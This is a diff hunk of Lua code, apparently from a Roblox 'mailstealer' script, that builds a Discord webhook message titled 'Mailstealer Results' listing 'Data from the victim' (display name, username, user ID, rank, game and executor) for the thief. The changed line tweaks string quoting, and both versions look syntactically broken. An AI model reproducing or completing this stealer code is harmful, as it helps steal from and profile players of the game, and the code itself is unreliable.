@@ -55,7 +55,7 @@ local msg = {
 	["embeds"]= {
 	  {
 		["title"]= "`Hostee Scriptz Mailstealer Results`",
-		["description"]= "**Data from the victim**\n"Reciever: ".. _G.UserNamey .."\n***<:Gigachad:1112768331146068069> Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username: ".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID: ".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place: ".._G.GameIn.."\n:skull_crossbones: Executor: "..exploit.."***",
+		["description"]= "**Data from the victim**\n"Reciever: ".. _G.UserNamey ..""\n***<:Gigachad:1112768331146068069> Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username: ".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID: ".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place: ".._G.GameIn.."\n:skull_crossbones: Executor: "..exploit.."***",
 		["url"]= "https://dsc.gg/hosteehub",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
